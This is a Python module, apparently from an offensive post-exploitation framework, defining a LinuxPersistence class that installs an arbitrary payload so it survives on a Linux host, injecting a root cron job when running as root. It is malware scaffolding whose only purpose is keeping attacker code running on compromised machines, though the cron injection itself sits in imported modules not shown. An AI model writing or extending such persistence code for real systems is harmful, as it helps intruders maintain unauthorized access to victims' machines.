"""
linux.py: Linux-specific persistence logic.
"""

from .base import Persistence
from .linux_utilities.persistence_methods import LinuxPersistenceMethods
from .linux_utilities.rootCronJob import InjectCronjob
from .unix_utilities.permissions import UnixPrivilege

class LinuxPersistence(Persistence):
    """
    Linux-specific persistence logic.

    identifier: Effective user ID of the user to install the payload as.
    """
    def __init__(self, payload: str, identifier: int, custom_method: str = None) -> None:
        super().__init__(payload, identifier, custom_method)

        # Inherited from Persistence class:
        self.payload
        self.identifier
        self.custom_method
        self.temp_dir
        self.recommended_method

        super().__post_init__()                 # called to find the recommended persistence method.


    def _determine_recommended_persistence_method(self) -> str:

        if self.identifier == UnixPrivilege.ROOT.value:
            return LinuxPersistenceMethods.ROOTCRONJOB.value

        return super()._determine_recommended_persistence_method()


    def supported_persistence_methods(self) -> list:
        
        methods = [method.value for method in LinuxPersistenceMethods]
        
        return methods


    def install(self) -> None:
        method = self.configured_persistence_method()

        if method == LinuxPersistenceMethods.ROOTCRONJOB.value:
            InjectCronjob(self.payload).injectRoot()
            return

        # raise NotImplementedError(f"Method {method} not implemented.") 